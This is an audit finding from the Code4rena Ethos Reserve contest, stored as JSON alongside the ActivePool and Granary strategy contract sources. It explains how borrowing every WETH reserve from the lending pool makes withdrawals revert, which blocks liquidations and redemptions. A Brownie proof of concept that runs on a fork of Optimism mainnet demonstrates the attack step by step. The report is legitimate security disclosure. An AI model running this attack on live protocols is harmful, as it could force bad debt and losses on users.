{
  "Title": "[M-06] Denial of Liquidations and Redemptions by borrowing all reserves from AAVE",
  "Content": "# Lines of code\n\nhttps://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L239\nhttps://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L200\n\n\n# Vulnerability details\n\n### Impact\n\nLiquidations and Redemptions can be prevented by making [`ActivePool._rebalance`](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L239) revert by borrowing all collateral from AAVEs lendingPool.\n\nThe ActivePool will invest in the Vault, which will use the strategy to invest in the lending pool.\n\nWhen withdrawing collateral, by Closing CDPs, Redeeming or Liquidating, [`_rebalance`](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L174) will be called.\n\nIn most logical cases (high capital efficiency), this will trigger a [withdrawal from the Strategy](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L385) \n\nWhich will trigger a [withdrawawal from the LendingPool](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L200), \n\n\nAn attacker can deny this operation [by borrowing all reserves from AAVE](https://medium.com/aave/understanding-the-risks-of-aave-43334dbfc6d0#:~:text=This%20situation%20can%20be%20problematic%20if%20depositors%20wish%20to%20withdraw%20their%20liquidity%2C%20but%20no%20funds%20are%20available.).\n\n\nThis will prevent all Liquidations, Redemptions as well as withdrawals, at will of the attacker.\n\nThis can be done to force the protocol to enter Recovery Mode, force re-absorptions and it can be pushed as far as to trigger bad debt.\n\nNote that the attack can be performed maliciously without the need for a front-run, a sandwich (front-run + back-run) will just make it less costly (less interest paid) for the attacker but is not a way to prevent the attack.\n\n### Preamble to the POC\n\nAny time funds are pulled from the ActivePool, `_rebalance` is called.\n\nWe know that if a withdrawal is sizeable enough, `_rebalance` will trigger `Strategy._withdraw` which will attempt to `withdraw` from the lending pool.\n\nThe goal of the POC then is to show how we can make it impossible to perform a withdrawal, guaranteeing a revert on all calls to `_rebalance` which consequently will brick Redemptions and Liquidations\n\n### POC\n\nThe POC is coded in brownie, I have setup a MockFile to be able to fork optimism, with the final addresses hardcoded in the strategy (Granary).\n\n#### Goal of the POC\n\nThe goal of the POC is to demonstrate that withdrawals from the pool can be denied.\n\nThis shows how we can trigger a revert against `LendingPool.withdraw` which we know will cause `_rebalance` to revert as well\n\n#### Coded POC\n\nThe following mock allows us to interact with the forked contracts\n\n```solidity\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.0;\n\ncontract LendingPool {\n  function deposit(\n    address asset,\n    uint256 amount,\n    address onBehalfOf,\n    uint16 referralCode\n  ) external {}\n\n  function borrow(\n    address asset,\n    uint256 amount,\n    uint256 interestRateMode,\n    uint16 referralCode,\n    address onBehalfOf\n  ) external {}\n\n  function withdraw(\n    address asset,\n    uint256 amount,\n    address to\n  ) external {}\n}\n```\n\nWe can then fork optimism mainnet\n\n```bash\nbrownie console --network optimism-main-fork\n```\n\nRun the following commands to show the attack\n\n```python\n## Setup addresses\nlp = LendingPool.at(\"0x8FD4aF47E4E63d1D2D45582c3286b4BD9Bb95DfE\")\na_token = interface.ERC20(\"0xfF94cc8E2c4B17e3CC65d7B83c7e8c643030D936\")\nweth = interface.ERC20(\"0x4200000000000000000000000000000000000006\")\nusdc = interface.ERC20(\"0x7F5c764cBc14f9669B88837ca1490cCa17c31607\")\n\n## Setup Actors\nweth_whale = accounts.at(\"0xe50fa9b3c56ffb159cb0fca61f5c9d750e8128c8\", force=True)\nusdc_whale = accounts.at(\"0x625e7708f30ca75bfd92586e17077590c60eb4cd\", force=True)\n\nstrategy = a[0]\nexploiter = a[1]\n\n## Fund Strategy with WETH\nweth.transfer(strategy, 20e18, {\"from\": weth_whale})\n\n## Strategy Deposits WETH\nweth.approve(lp, 20e18, {\"from\": strategy})\nlp.deposit(weth, 20e18, strategy, 0, {\"from\": strategy})\n\n\n## Fund exploiter with USDC, they will borrow WETH\nusdc.transfer(exploiter, usdc.balanceOf(usdc_whale), {\"from\": usdc_whale})\n\n## Setup collateral so we can dry up WETH\nusdc.approve(lp, usdc.balanceOf(exploiter), {\"from\": exploiter})\nlp.deposit(usdc, usdc.balanceOf(exploiter), exploiter, 0, {\"from\": exploiter})\n\n## Borrow Max, so no WETH is borrowable\nto_borrow = weth.balanceOf(a_token)\nlp.borrow(weth, to_borrow, 2, 0, exploiter, {\"from\": exploiter})\n\nprint(weth.balanceOf(a_token))\n0 ## No weth left, next withdrawal will revert\n\n## Strategy will not be able withdraw\nto_withdraw = a_token.balanceOf(strategy)\nassert to_withdraw > 0\n\n## REVERTS HERE\nlp.withdraw(weth, to_withdraw, strategy, {\"from\": strategy})\n\n>>> Transaction sent: 0x2d129abc6f69d74db7567de54d9932ac406d2212c350ff7f16e66d3fb034e036\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 3\n  LendingPool.withdraw confirmed (SafeMath: subtraction overflow)   Block: 79015780   Gas used: 138952 (0.69%)\n\n```\n\nAny time the Strategy needs to withdraw from the pool, because of `_rebalance` that withdrawal can be denied, which will consequently prevent Collateral from being pulled, which in turn will prevent Redemptions and Liquidations.\n\nThis means a overlevered malicious actor can bring down the peg of the system while preventing whichever liquidation or redemption they want\n\n\n### Remediation Steps\n\nI'm unclear as to a specific remediation, as AAVE, by design, will lend out all of it's reserves, meaning that the amount lent out should not be assumed as liquid.\n\nTheoretically, re-balancing only manually should protect more assets, making the threshold for the attack higher.\n\nHowever, any asset sent to the lending pool should be assumed illiquid, meaning that those amounts can be prevented from being withdrawable which will prevent Liquidations and Redemptions, potentially causing bad debt\n\n### Additional Considerations\n\nIf LUSD is liquid enough to be shorted, a goal as you'd assume the token to scale, then the attack not only can be performed against the system unconditionally, but can also become profitable as the attacker can arbitrarily force bad debt for the entire portion of collateral in the lendingPool, profiting from the loss of value",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2023-02-ethos-reserve-contest",
  "Code": [
    {
      "filename": "Ethos-Core/contracts/ActivePool.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity 0.6.11;\n\nimport './Interfaces/IActivePool.sol';\nimport \"./Interfaces/ICollateralConfig.sol\";\nimport './Interfaces/IDefaultPool.sol';\nimport \"./Interfaces/ICollSurplusPool.sol\";\nimport \"./Interfaces/ILQTYStaking.sol\";\nimport \"./Interfaces/IStabilityPool.sol\";\nimport \"./Interfaces/ITroveManager.sol\";\nimport \"./Dependencies/SafeMath.sol\";\nimport \"./Dependencies/Ownable.sol\";\nimport \"./Dependencies/CheckContract.sol\";\nimport \"./Dependencies/console.sol\";\nimport \"./Dependencies/SafeERC20.sol\";\nimport \"./Dependencies/IERC4626.sol\";\n\n/*\n * The Active Pool holds the collateral and LUSD debt for each collateral (but not LUSD tokens) for all active troves.\n *\n * When a trove is liquidated, it's collateral and LUSD debt are transferred from the Active Pool, to either the\n * Stability Pool, the Default Pool, or both, depending on the liquidation conditions.\n *\n */\ncontract ActivePool is Ownable, CheckContract, IActivePool {\n    using SafeMath for uint256;\n    using SafeERC20 for IERC20;\n\n    string constant public NAME = \"ActivePool\";\n\n    bool public addressesSet = false;\n    address public collateralConfigAddress;\n    address public borrowerOperationsAddress;\n    address public troveManagerAddress;\n    address public stabilityPoolAddress;\n    address public defaultPoolAddress;\n    address public collSurplusPoolAddress;\n    address public treasuryAddress;\n    address public lqtyStakingAddress;\n    mapping (address => uint256) internal collAmount;  // collateral => amount tracker\n    mapping (address => uint256) internal LUSDDebt;  // collateral => corresponding debt tracker\n\n    mapping (address => uint256) public yieldingPercentage; // collateral => % to use for yield farming (in BPS, <= 10k)\n    mapping (address => uint256) public yieldingAmount; // collateral => actual wei amount being used for yield farming\n    mapping (address => address) public yieldGenerator; // collateral => corresponding ERC4626 vault\n    mapping (address => uint256) public yieldClaimThreshold; // collateral => minimum wei amount of yield to claim and redistribute\n    \n    uint256 public yieldingPercentageDrift = 100; // rebalance iff % is off by more than 100 BPS\n\n    // Yield distribution params, must add up to 10k\n    uint256 public yieldSplitTreasury = 20_00; // amount of yield to direct to treasury in BPS\n    uint256 public yieldSplitSP = 40_00; // amount of yield to direct to stability pool in BPS\n    uint256 public yieldSplitStaking = 40_00; // amount of yield to direct to OATH Stakers in BPS\n\n    // --- Events ---\n\n    event CollateralConfigAddressChanged(address _newCollateralConfigAddress);\n    event BorrowerOperationsAddressChanged(address _newBorrowerOperationsAddress);\n    event TroveManagerAddressChanged(address _newTroveManagerAddress);\n    event CollSurplusPoolAddressChanged(address _collSurplusPoolAddress);\n    event ActivePoolLUSDDebtUpdated(address _collateral, uint _LUSDDebt);\n    event ActivePoolCollateralBalanceUpdated(address _collateral, uint _amount);\n    event YieldingPercentageUpdated(address _collateral, uint256 _bps);\n    event YieldingPercentageDriftUpdated(uint256 _driftBps);\n    event YieldClaimThresholdUpdated(address _collateral, uint256 _threshold);\n    event YieldDistributionParamsUpdated(uint256 _treasurySplit, uint256 _SPSplit, uint256 _stakingSplit);\n\n    // --- Contract setters ---\n\n    function setAddresses(\n        address _collateralConfigAddress,\n        address _borrowerOperationsAddress,\n        address _troveManagerAddress,\n        address _stabilityPoolAddress,\n        address _defaultPoolAddress,\n        address _collSurplusPoolAddress,\n        address _treasuryAddress,\n        address _lqtyStakingAddress,\n        address[] calldata _erc4626vaults\n    )\n        external\n        onlyOwner\n    {\n        require(!addressesSet, \"Can call setAddresses only once\");\n\n        checkContract(_collateralConfigAddress);\n        checkContract(_borrowerOperationsAddress);\n        checkContract(_troveManagerAddress);\n        checkContract(_stabilityPoolAddress);\n        checkContract(_defaultPoolAddress);\n        checkContract(_collSurplusPoolAddress);\n        require(_treasuryAddress != address(0), \"Treasury cannot be 0 address\");\n        checkContract(_lqtyStakingAddress);\n\n        collateralConfigAddress = _collateralConfigAddress;\n        borrowerOperationsAddress = _borrowerOperationsAddress;\n        troveManagerAddress = _troveManagerAddress;\n        stabilityPoolAddress = _stabilityPoolAddress;\n        defaultPoolAddress = _defaultPoolAddress;\n        collSurplusPoolAddress = _collSurplusPoolAddress;\n        treasuryAddress = _treasuryAddress;\n        lqtyStakingAddress = _lqtyStakingAddress;\n\n        address[] memory collaterals = ICollateralConfig(collateralConfigAddress).getAllowedCollaterals();\n        uint256 numCollaterals = collaterals.length;\n        require(numCollaterals == _erc4626vaults.length, \"Vaults array length must match number of collaterals\");\n        for(uint256 i = 0; i < numCollaterals; i++) {\n            address collateral = collaterals[i];\n            address vault = _erc4626vaults[i];\n            require(IERC4626(vault).asset() == collateral, \"Vault asset must be collateral\");\n            yieldGenerator[collateral] = vault;\n        }\n\n        emit CollateralConfigAddressChanged(_collateralConfigAddress);\n        emit BorrowerOperationsAddressChanged(_borrowerOperationsAddress);\n        emit TroveManagerAddressChanged(_troveManagerAddress);\n        emit StabilityPoolAddressChanged(_stabilityPoolAddress);\n        emit DefaultPoolAddressChanged(_defaultPoolAddress);\n        emit CollSurplusPoolAddressChanged(_collSurplusPoolAddress);\n\n        addressesSet = true;\n    }\n\n    function setYieldingPercentage(address _collateral, uint256 _bps) external onlyOwner {\n        _requireValidCollateralAddress(_collateral);\n        require(_bps <= 10_000, \"Invalid BPS value\");\n        yieldingPercentage[_collateral] = _bps;\n        emit YieldingPercentageUpdated(_collateral, _bps);\n    }\n\n    function setYieldingPercentageDrift(uint256 _driftBps) external onlyOwner {\n        require(_driftBps <= 500, \"Exceeds max allowed value of 500 BPS\");\n        yieldingPercentageDrift = _driftBps;\n        emit YieldingPercentageDriftUpdated(_driftBps);\n    }\n\n    function setYieldClaimThreshold(address _collateral, uint256 _threshold) external onlyOwner {\n        _requireValidCollateralAddress(_collateral);\n        yieldClaimThreshold[_collateral] = _threshold;\n        emit YieldClaimThresholdUpdated(_collateral, _threshold);\n    }\n\n    function setYieldDistributionParams(uint256 _treasurySplit, uint256 _SPSplit, uint256 _stakingSplit) external onlyOwner {\n        require(_treasurySplit + _SPSplit + _stakingSplit == 10_000, \"Splits must add up to 10000 BPS\");\n        yieldSplitTreasury = _treasurySplit;\n        yieldSplitSP = _SPSplit;\n        yieldSplitStaking = _stakingSplit;\n        emit YieldDistributionParamsUpdated(_treasurySplit, _SPSplit, _stakingSplit);\n    }\n\n    // --- Getters for public variables. Required by IPool interface ---\n\n    /*\n    * Returns the collAmount state variable.\n    *\n    *Not necessarily equal to the the contract's raw collateral balance - collateral can be forcibly sent to contracts.\n    */\n    function getCollateral(address _collateral) external view override returns (uint) {\n        _requireValidCollateralAddress(_collateral);\n        return collAmount[_collateral];\n    }\n\n    function getLUSDDebt(address _collateral) external view override returns (uint) {\n        _requireValidCollateralAddress(_collateral);\n        return LUSDDebt[_collateral];\n    }\n\n    // --- Pool functionality ---\n\n    function sendCollateral(address _collateral, address _account, uint _amount) external override {\n        _requireValidCollateralAddress(_collateral);\n        _requireCallerIsBOorTroveMorSP();\n        _rebalance(_collateral, _amount);\n        collAmount[_collateral] = collAmount[_collateral].sub(_amount);\n        emit ActivePoolCollateralBalanceUpdated(_collateral, collAmount[_collateral]);\n        emit CollateralSent(_collateral, _account, _amount);\n\n        if (_account == defaultPoolAddress) {\n            IERC20(_collateral).safeIncreaseAllowance(defaultPoolAddress, _amount);\n            IDefaultPool(defaultPoolAddress).pullCollateralFromActivePool(_collateral, _amount);\n        } else if (_account == collSurplusPoolAddress) {\n            IERC20(_collateral).safeIncreaseAllowance(collSurplusPoolAddress, _amount);\n            ICollSurplusPool(collSurplusPoolAddress).pullCollateralFromActivePool(_collateral, _amount);\n        } else {\n            IERC20(_collateral).safeTransfer(_account, _amount);\n        }\n    }\n\n    function increaseLUSDDebt(address _collateral, uint _amount) external override {\n        _requireValidCollateralAddress(_collateral);\n        _requireCallerIsBOorTroveM();\n        LUSDDebt[_collateral] = LUSDDebt[_collateral].add(_amount);\n        ActivePoolLUSDDebtUpdated(_collateral, LUSDDebt[_collateral]);\n    }\n\n    function decreaseLUSDDebt(address _collateral, uint _amount) external override {\n        _requireValidCollateralAddress(_collateral);\n        _requireCallerIsBOorTroveMorSP();\n        LUSDDebt[_collateral] = LUSDDebt[_collateral].sub(_amount);\n        ActivePoolLUSDDebtUpdated(_collateral, LUSDDebt[_collateral]);\n    }\n\n    function pullCollateralFromBorrowerOperationsOrDefaultPool(address _collateral, uint _amount) external override {\n        _requireValidCollateralAddress(_collateral);\n        _requireCallerIsBorrowerOperationsOrDefaultPool();\n        collAmount[_collateral] = collAmount[_collateral].add(_amount);\n        emit ActivePoolCollateralBalanceUpdated(_collateral, collAmount[_collateral]);\n\n        IERC20(_collateral).safeTransferFrom(msg.sender, address(this), _amount);\n        _rebalance(_collateral, 0);\n    }\n\n    function manualRebalance(address _collateral, uint256 _simulatedAmountLeavingPool) external onlyOwner {\n        _requireValidCollateralAddress(_collateral);\n        _rebalance(_collateral, _simulatedAmountLeavingPool);\n    }\n\n    // Due to \"stack too deep\" error\n    struct LocalVariables_rebalance {\n        uint256 currentAllocated;\n        IERC4626 yieldGenerator;\n        uint256 ownedShares;\n        uint256 sharesToAssets;\n        uint256 profit;\n        uint256 finalBalance;\n        uint256 percentOfFinalBal;\n        uint256 yieldingPercentage;\n        uint256 toDeposit;\n        uint256 toWithdraw;\n        uint256 yieldingAmount;\n        uint256 finalYieldingAmount;\n        int256 netAssetMovement;\n        uint256 treasurySplit;\n        uint256 stakingSplit;\n        uint256 stabilityPoolSplit;\n    }\n\n    function _rebalance(address _collateral, uint256 _amountLeavingPool) internal {\n        LocalVariables_rebalance memory vars;\n\n        // how much has been allocated as per our internal records?\n        vars.currentAllocated = yieldingAmount[_collateral];\n        \n        // what is the present value of our shares?\n        vars.yieldGenerator = IERC4626(yieldGenerator[_collateral]);\n        vars.ownedShares = vars.yieldGenerator.balanceOf(address(this));\n        vars.sharesToAssets = vars.yieldGenerator.convertToAssets(vars.ownedShares);\n\n        // if we have profit that's more than the threshold, record it for withdrawal and redistribution\n        vars.profit = vars.sharesToAssets.sub(vars.currentAllocated);\n        if (vars.profit < yieldClaimThreshold[_collateral]) {\n            vars.profit = 0;\n        }\n        \n        // what % of the final pool balance would the current allocation be?\n        vars.finalBalance = collAmount[_collateral].sub(_amountLeavingPool);\n        vars.percentOfFinalBal = vars.finalBalance == 0 ? uint256(-1) : vars.currentAllocated.mul(10_000).div(vars.finalBalance);\n\n        // if abs(percentOfFinalBal - yieldingPercentage) > drift, we will need to deposit more or withdraw some\n        vars.yieldingPercentage = yieldingPercentage[_collateral];\n        vars.finalYieldingAmount = vars.finalBalance.mul(vars.yieldingPercentage).div(10_000);\n        vars.yieldingAmount = yieldingAmount[_collateral];\n        if (vars.percentOfFinalBal > vars.yieldingPercentage && vars.percentOfFinalBal.sub(vars.yieldingPercentage) > yieldingPercentageDrift) {\n            // we will end up overallocated, withdraw some\n            vars.toWithdraw = vars.currentAllocated.sub(vars.finalYieldingAmount);\n            vars.yieldingAmount = vars.yieldingAmount.sub(vars.toWithdraw);\n            yieldingAmount[_collateral] = vars.yieldingAmount;\n        } else if(vars.percentOfFinalBal < vars.yieldingPercentage && vars.yieldingPercentage.sub(vars.percentOfFinalBal) > yieldingPercentageDrift) {\n            // we will end up underallocated, deposit more\n            vars.toDeposit = vars.finalYieldingAmount.sub(vars.currentAllocated);\n            vars.yieldingAmount = vars.yieldingAmount.add(vars.toDeposit);\n            yieldingAmount[_collateral] = vars.yieldingAmount;\n        }\n\n        // + means deposit, - means withdraw\n        vars.netAssetMovement = int256(vars.toDeposit) - int256(vars.toWithdraw) - int256(vars.profit);\n        if (vars.netAssetMovement > 0) {\n            IERC20(_collateral).safeIncreaseAllowance(yieldGenerator[_collateral], uint256(vars.netAssetMovement));\n            IERC4626(yieldGenerator[_collateral]).deposit(uint256(vars.netAssetMovement), address(this));\n        } else if (vars.netAssetMovement < 0) {\n            IERC4626(yieldGenerator[_collateral]).withdraw(uint256(-vars.netAssetMovement), address(this), address(this));\n        }\n\n        // if we recorded profit, recalculate it for precision and distribute\n        if (vars.profit != 0) {\n            // profit is ultimately (coll at hand) + (coll allocated to yield generator) - (recorded total coll Amount in pool)\n            vars.profit = IERC20(_collateral).balanceOf(address(this)).add(vars.yieldingAmount).sub(collAmount[_collateral]);\n            if (vars.profit != 0) {\n                // distribute to treasury, staking pool, and stability pool\n                vars.treasurySplit = vars.profit.mul(yieldSplitTreasury).div(10_000);\n                if (vars.treasurySplit != 0) {\n                    IERC20(_collateral).safeTransfer(treasuryAddress, vars.treasurySplit);\n                }\n\n                vars.stakingSplit = vars.profit.mul(yieldSplitStaking).div(10_000);\n                if (vars.stakingSplit != 0) {\n                    IERC20(_collateral).safeTransfer(lqtyStakingAddress, vars.stakingSplit);\n                    ILQTYStaking(lqtyStakingAddress).increaseF_Collateral(_collateral, vars.stakingSplit);\n                }\n\n                vars.stabilityPoolSplit = vars.profit.sub(vars.treasurySplit.add(vars.stakingSplit));\n                if (vars.stabilityPoolSplit != 0) {\n                    IERC20(_collateral).safeTransfer(stabilityPoolAddress, vars.stabilityPoolSplit);\n                    IStabilityPool(stabilityPoolAddress).updateRewardSum(_collateral, vars.stabilityPoolSplit);   \n                }\n            }\n        }\n    }\n\n    // --- 'require' functions ---\n\n    function _requireValidCollateralAddress(address _collateral) internal view {\n        require(\n            ICollateralConfig(collateralConfigAddress).isCollateralAllowed(_collateral),\n            \"Invalid collateral address\"\n        );\n    }\n\n    function _requireCallerIsBorrowerOperationsOrDefaultPool() internal view {\n        require(\n            msg.sender == borrowerOperationsAddress ||\n            msg.sender == defaultPoolAddress,\n            \"ActivePool: Caller is neither BO nor Default Pool\");\n    }\n\n    function _requireCallerIsBOorTroveMorSP() internal view {\n        address redemptionHelper = address(ITroveManager(troveManagerAddress).redemptionHelper());\n        require(\n            msg.sender == borrowerOperationsAddress ||\n            msg.sender == troveManagerAddress ||\n            msg.sender == redemptionHelper ||\n            msg.sender == stabilityPoolAddress,\n            \"ActivePool: Caller is neither BorrowerOperations nor TroveManager nor StabilityPool\");\n    }\n\n    function _requireCallerIsBOorTroveM() internal view {\n        require(\n            msg.sender == borrowerOperationsAddress ||\n            msg.sender == troveManagerAddress,\n            \"ActivePool: Caller is neither BorrowerOperations nor TroveManager\");\n    }\n}"
    },
    {
      "filename": "Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol",
      "content": "// SPDX-License-Identifier: BUSL1.1\n\npragma solidity ^0.8.0;\n\nimport \"./abstract/ReaperBaseStrategyv4.sol\";\nimport \"./interfaces/IAToken.sol\";\nimport \"./interfaces/IAaveProtocolDataProvider.sol\";\nimport \"./interfaces/ILendingPool.sol\";\nimport \"./interfaces/ILendingPoolAddressesProvider.sol\";\nimport \"./interfaces/IRewardsController.sol\";\nimport \"./libraries/ReaperMathUtils.sol\";\nimport \"./mixins/VeloSolidMixin.sol\";\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/utils/math/MathUpgradeable.sol\";\n\n/**\n * @dev This strategy will deposit a token on Granary to maximize yield\n */\ncontract ReaperStrategyGranarySupplyOnly is ReaperBaseStrategyv4, VeloSolidMixin {\n    using ReaperMathUtils for uint256;\n    using SafeERC20Upgradeable for IERC20Upgradeable;\n\n    // 3rd-party contract addresses\n    address public constant VELO_ROUTER = 0xa132DAB612dB5cB9fC9Ac426A0Cc215A3423F9c9;\n    ILendingPoolAddressesProvider public constant ADDRESSES_PROVIDER =\n        ILendingPoolAddressesProvider(0xdDE5dC81e40799750B92079723Da2acAF9e1C6D6);\n    IAaveProtocolDataProvider public constant DATA_PROVIDER =\n        IAaveProtocolDataProvider(0x9546F673eF71Ff666ae66d01Fd6E7C6Dae5a9995);\n    IRewardsController public constant REWARDER = IRewardsController(0x6A0406B8103Ec68EE9A713A073C7bD587c5e04aD);\n\n    // this strategy's configurable tokens\n    IAToken public gWant;\n\n    // Misc constants\n    uint16 private constant LENDER_REFERRAL_CODE_NONE = 0;\n\n    /**\n     * @dev Tokens Used:\n     * {rewardClaimingTokens} - Array containing gWant, used for claiming rewards\n     */\n    address[] public rewardClaimingTokens;\n\n    /**\n     * We break down the harvest logic into the following operations:\n     * 1. Claiming rewards\n     * 2. A series of swaps as required\n     * 3. Creating more of the strategy's underlying token, if necessary.\n     *\n     * #1 and #3 are specific to each protocol.\n     * #2 however is mostly the same across all strats. So to make things more generic, we\n     * will execute #2 by iterating through a series of pre-defined \"steps\".\n     *\n     * This array holds all the swapping operations in sequence.\n     * {ADMIN} role or higher will be able to set this array.\n     */\n    address[2][] public steps;\n\n    /**\n     * @dev Initializes the strategy. Sets parameters, saves routes, and gives allowances.\n     * @notice see documentation for each variable above its respective declaration.\n     */\n    function initialize(\n        address _vault,\n        address[] memory _strategists,\n        address[] memory _multisigRoles,\n        IAToken _gWant\n    ) public initializer {\n        gWant = _gWant;\n        want = _gWant.UNDERLYING_ASSET_ADDRESS();\n        __ReaperBaseStrategy_init(_vault, want, _strategists, _multisigRoles);\n        rewardClaimingTokens = [address(_gWant)];\n    }\n\n    function _adjustPosition(uint256 _debt) internal override {\n        if (emergencyExit) {\n            return;\n        }\n\n        uint256 wantBalance = balanceOfWant();\n        if (wantBalance > _debt) {\n            uint256 toReinvest = wantBalance - _debt;\n            _deposit(toReinvest);\n        }\n    }\n\n    function _liquidatePosition(uint256 _amountNeeded)\n        internal\n        override\n        returns (uint256 liquidatedAmount, uint256 loss)\n    {\n        uint256 wantBal = balanceOfWant();\n        if (wantBal < _amountNeeded) {\n            _withdraw(_amountNeeded - wantBal);\n            liquidatedAmount = balanceOfWant();\n        } else {\n            liquidatedAmount = _amountNeeded;\n        }\n\n        if (_amountNeeded > liquidatedAmount) {\n            loss = _amountNeeded - liquidatedAmount;\n        }\n    }\n\n    function _liquidateAllPositions() internal override returns (uint256 amountFreed) {\n        _withdrawUnderlying(balanceOfPool());\n        return balanceOfWant();\n    }\n\n    /**\n     * @dev Core function of the strat, in charge of collecting and swapping rewards\n     *      to produce more want.\n     * @notice Assumes the deposit will take care of resupplying excess want.\n     */\n    function _harvestCore(uint256 _debt) internal override returns (int256 roi, uint256 repayment) {\n        _claimRewards();\n        uint256 numSteps = steps.length;\n        for (uint256 i = 0; i < numSteps; i = i.uncheckedInc()) {\n            address[2] storage step = steps[i];\n            IERC20Upgradeable startToken = IERC20Upgradeable(step[0]);\n            uint256 amount = startToken.balanceOf(address(this));\n            if (amount == 0) {\n                continue;\n            }\n            _swapVelo(step[0], step[1], amount, VELO_ROUTER);\n        }\n\n        uint256 allocated = IVault(vault).strategies(address(this)).allocated;\n        uint256 totalAssets = balanceOf();\n        uint256 toFree = _debt;\n\n        if (totalAssets > allocated) {\n            uint256 profit = totalAssets - allocated;\n            toFree += profit;\n            roi = int256(profit);\n        } else if (totalAssets < allocated) {\n            roi = -int256(allocated - totalAssets);\n        }\n\n        (uint256 amountFreed, uint256 loss) = _liquidatePosition(toFree);\n        repayment = MathUpgradeable.min(_debt, amountFreed);\n        roi -= int256(loss);\n    }\n\n    /**\n     * Only {STRATEGIST} or higher roles may update the swap path for a token.\n     */\n    function updateVeloSwapPath(\n        address _tokenIn,\n        address _tokenOut,\n        address[] calldata _path\n    ) external override {\n        _atLeastRole(STRATEGIST);\n        _updateVeloSwapPath(_tokenIn, _tokenOut, _path);\n    }\n\n    /**\n     * Only {ADMIN} or higher roles may set the array\n     * of steps executed as part of harvest.\n     */\n    function setHarvestSteps(address[2][] calldata _newSteps) external {\n        _atLeastRole(ADMIN);\n        delete steps;\n\n        uint256 numSteps = _newSteps.length;\n        for (uint256 i = 0; i < numSteps; i = i.uncheckedInc()) {\n            address[2] memory step = _newSteps[i];\n            require(step[0] != address(0));\n            require(step[1] != address(0));\n            steps.push(step);\n        }\n    }\n\n    /**\n     * @dev Function that puts the funds to work.\n     */\n    function _deposit(uint256 toReinvest) internal {\n        if (toReinvest != 0) {\n            address lendingPoolAddress = ADDRESSES_PROVIDER.getLendingPool();\n            IERC20Upgradeable(want).safeIncreaseAllowance(lendingPoolAddress, toReinvest);\n            ILendingPool(lendingPoolAddress).deposit(want, toReinvest, address(this), LENDER_REFERRAL_CODE_NONE);\n        }\n    }\n\n    /**\n     * @dev Withdraws funds from external contracts and brings them back to this contract.\n     */\n    function _withdraw(uint256 _amount) internal {\n        if (_amount != 0) {\n            _withdrawUnderlying(_amount);\n        }\n    }\n\n    /**\n     * @dev Attempts to Withdraw {_withdrawAmount} from pool. Withdraws max amount that can be\n     *      safely withdrawn if {_withdrawAmount} is too high.\n     */\n    function _withdrawUnderlying(uint256 _withdrawAmount) internal {\n        uint256 withdrawable = balanceOfPool();\n        _withdrawAmount = MathUpgradeable.min(_withdrawAmount, withdrawable);\n        ILendingPool(ADDRESSES_PROVIDER.getLendingPool()).withdraw(address(want), _withdrawAmount, address(this));\n    }\n\n    /**\n     * @dev Claim rewards for supply.\n     */\n    function _claimRewards() internal {\n        IRewardsController(REWARDER).claimAllRewardsToSelf(rewardClaimingTokens);\n    }\n\n    /**\n     * @dev Attempts to safely withdraw {_amount} from the pool.\n     */\n    function authorizedWithdrawUnderlying(uint256 _amount) external {\n        _atLeastRole(STRATEGIST);\n        _withdrawUnderlying(_amount);\n    }\n\n    /**\n     * @dev Function to calculate the total {want} held by the strat.\n     * It takes into account both the funds in hand, plus the funds in the lendingPool.\n     */\n    function balanceOf() public view override returns (uint256) {\n        return balanceOfPool() + balanceOfWant();\n    }\n\n    function balanceOfWant() public view returns (uint256) {\n        return IERC20Upgradeable(want).balanceOf(address(this));\n    }\n\n    function balanceOfPool() public view returns (uint256) {\n        (uint256 supply, , , , , , , , ) = IAaveProtocolDataProvider(DATA_PROVIDER).getUserReserveData(\n            address(want),\n            address(this)\n        );\n        return supply;\n    }\n}"
    }
  ]
}